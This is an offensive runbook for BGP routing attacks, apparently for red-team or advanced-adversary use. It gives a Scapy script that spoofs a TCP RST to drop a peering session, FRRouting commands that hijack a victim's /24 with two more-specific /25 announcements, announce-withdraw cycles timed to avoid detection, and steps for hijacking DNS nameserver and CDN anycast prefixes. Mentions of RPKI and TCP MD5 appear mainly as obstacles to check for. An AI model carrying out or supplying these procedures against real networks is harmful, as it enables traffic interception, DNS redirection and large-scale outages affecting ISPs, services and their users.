# Runbook: BGP routing attacks

## Objective

Manipulate BGP routing to intercept, redirect, or disrupt traffic at internet scale. These techniques require either access to a BGP-speaking router (via compromised infrastructure, rogue peering, or a purchased ASN), or a position on the path between two BGP peers to attack the peering session itself.

BGP attacks are primarily relevant to nation-state and advanced adversary scenarios: ISP compromise, internet exchange presence, or state-directed network operations. They are also relevant to red team engagements scoped to include network infrastructure and ISP-level components.

## Prerequisites

- ASN and IP address space (obtained legitimately or through compromise of a BGP-speaking host).
- BGP software: `bgpd` (Quagga/FRRouting), GoBGP, or BIRD.
- Route collector access for monitoring: RIPE RIS, RouteViews, BGPlay.
- An understanding of the target prefix's origin AS and current RPKI validation status.

## Phase 1: Reconnaissance

Identify the target prefix and its routing state before taking any action:

```bash
# Look up the ASN originating the target prefix
whois -h whois.radb.net 203.0.113.0/24

# Check RPKI validation status
rpki-client -v 203.0.113.0/24
# Or query an RPKI validator
curl 'https://rpki-validator.ripe.net/api/v1/validity/<origin-ASN>/203.0.113.0/24'

# Check current BGP paths via RouteViews
curl 'https://stat.ripe.net/data/bgp-state/data.json?resource=203.0.113.0/24'

# Monitor for existing prefix visibility
bgpstuff.net or bgp.he.net for quick path lookup
```

Note whether the prefix has an RPKI ROA. A valid ROA means downstream RPKI-validating routers will reject an announcement from an unauthorised origin AS. Prefixes without ROAs, or with ROAs that permit a broader range than the specific prefix, are more susceptible.

## Phase 2: BGP session teardown (TCP RST injection)

If positioned on the path between two BGP peers and able to observe traffic, inject a TCP RST into the BGP session to terminate the peering relationship:

```bash
# Identify BGP sessions (TCP port 179)
tcpdump -i eth0 -n 'tcp port 179'
```

A correctly sequenced RST causes the BGP session to drop and routes to be withdrawn. The impact is a route flap and temporary loss of reachability for prefixes only reachable via that peering.

With Scapy, construct a spoofed RST using the observed sequence number:

```python
from scapy.all import *

# Observed from the BGP session capture
src_ip = "10.0.0.1"   # BGP peer A
dst_ip = "10.0.0.2"   # BGP peer B
sport = 179
dport = 54321         # Ephemeral port from capture
seq = 0xDEADBEEF      # Sequence number from captured packet

pkt = IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dport, flags="R", seq=seq)
send(pkt)
```

TCP MD5 authentication on the BGP session (RFC 2385) prevents this attack: the RST will be rejected if the MD5 signature is absent or incorrect.

## Phase 3: Prefix hijacking

From a BGP-speaking host with peering relationships (compromised router, rogue AS, or co-operative ISP), announce a more-specific prefix to draw traffic away from the legitimate origin:

```
# FRRouting configuration to announce a more-specific hijack
vtysh
configure terminal
router bgp <attacker-ASN>
  network 203.0.113.0/25    ! More specific than the victim's /24
  network 203.0.113.128/25  ! Covering the full /24 with two /25s
commit
```

More-specific announcements are preferred by BGP's longest-prefix-match rule. Traffic destined for the victim's /24 will route to the attacker's /25 announcements instead, even if the victim's /24 remains announced.

Monitor propagation using route collectors:

```bash
# Check whether the announcement is visible globally
curl 'https://stat.ripe.net/data/bgp-state/data.json?resource=203.0.113.0/25'
```

A subprefix hijack that forwards traffic to the legitimate destination after interception is a transparent man-in-the-middle. A blackhole hijack withdraws rather than forwards, making the prefix unreachable.

## Phase 4: Stealthy route manipulation

Short-duration hijacks of seconds to minutes are significantly harder to detect than persistent announcements. The window of interception is narrow but sufficient for targeted traffic capture.

Rapid announce-withdraw cycles:

```bash
# Announce the prefix
vtysh -c "configure terminal" -c "router bgp <ASN>" -c "network 203.0.113.0/25"

# Wait for propagation (typically 30-90 seconds)
sleep 90

# Withdraw after capturing the desired traffic window
vtysh -c "configure terminal" -c "router bgp <ASN>" -c "no network 203.0.113.0/25"
```

AS-path prepending on legitimate announcements adjusts traffic engineering without triggering MOAS (Multiple Origin AS) alerts, since the origin AS remains unchanged:

```bash
# Prepend own ASN to make path look less attractive to some peers
router bgp <ASN>
  neighbor <peer-IP> route-map PREPEND out
route-map PREPEND permit 10
  set as-path prepend <ASN> <ASN> <ASN>
```

## Phase 5: BGP + DNS and BGP + CDN targeting

BGP hijacking of DNS authoritative server prefixes redirects DNS resolution for all names served by those addresses. The procedure is identical to prefix hijacking but the target prefix is the announced range containing the victim's nameservers.

Identify nameserver addresses:

```bash
dig NS target.com
dig A ns1.target.com  # Resolve to IP, then find the announced prefix
whois <ns-IP>
```

CDN and cloud providers use anycast: the same prefix is announced from dozens of locations simultaneously. Hijacking a CDN prefix in a specific geographic region draws traffic from clients in that region to the attacker's network while clients elsewhere continue to reach the legitimate CDN edge.

Anycast hijacking requires presence at or near the target region's routing topology. The more-specific announcement approach applies, targeting the regional prefix allocation rather than the global anycast block.

## Evidence collection

Document: prefixes announced, duration, geographic scope of propagation (from route collector data), traffic volume intercepted if applicable, and whether RPKI validation prevented propagation to any peers.
